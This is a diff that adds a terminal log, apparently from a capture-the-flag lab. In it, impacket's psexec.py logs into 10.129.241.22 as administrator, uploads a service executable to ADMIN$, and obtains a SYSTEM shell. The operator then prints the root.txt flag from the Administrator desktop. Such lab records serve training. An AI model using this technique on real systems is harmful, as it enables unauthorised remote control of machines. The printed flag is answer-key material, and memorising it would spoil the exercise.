@@ -1,0 +1,78 @@
+$ python /usr/share/impacket/examples/psexec.py administrator@10.129.241.22
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.129.241.22.....
+[*] Found writable share ADMIN$
+[*] Uploading file CciRQacI.exe
+[*] Opening SVCManager on 10.129.241.22.....
+[*] Creating service DKEI on 10.129.241.22.....
+[*] Starting service DKEI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> cd C:/user
+The system cannot find the path specified.
+
+C:\Windows\system32> cd C:/Users
+
+C:\Users> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users
+
+01/19/2020  04:10 PM    <DIR>          .
+01/19/2020  04:10 PM    <DIR>          ..
+01/19/2020  11:39 PM    <DIR>          Administrator
+01/19/2020  11:39 PM    <DIR>          Public
+01/20/2020  06:01 AM    <DIR>          sql_svc
+               0 File(s)              0 bytes
+               5 Dir(s)  10,706,886,656 bytes free
+
+C:\Users> cd Administrator
+
+C:\Users\Administrator> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\Administrator
+
+01/19/2020  11:39 PM    <DIR>          .
+01/19/2020  11:39 PM    <DIR>          ..
+07/27/2021  02:30 AM    <DIR>          3D Objects
+07/27/2021  02:30 AM    <DIR>          Contacts
+07/27/2021  02:30 AM    <DIR>          Desktop
+07/27/2021  02:30 AM    <DIR>          Documents
+07/27/2021  02:30 AM    <DIR>          Downloads
+07/27/2021  02:30 AM    <DIR>          Favorites
+07/27/2021  02:30 AM    <DIR>          Links
+07/27/2021  02:30 AM    <DIR>          Music
+07/27/2021  02:30 AM    <DIR>          Pictures
+07/27/2021  02:30 AM    <DIR>          Saved Games
+07/27/2021  02:30 AM    <DIR>          Searches
+07/27/2021  02:30 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  10,706,886,656 bytes free
+
+C:\Users\Administrator> cd Desktop
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/27/2021  02:30 AM    <DIR>          .
+07/27/2021  02:30 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,706,886,656 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+b91ccec3305e98240082d4474b848528
+C:\Users\Administrator\Desktop>
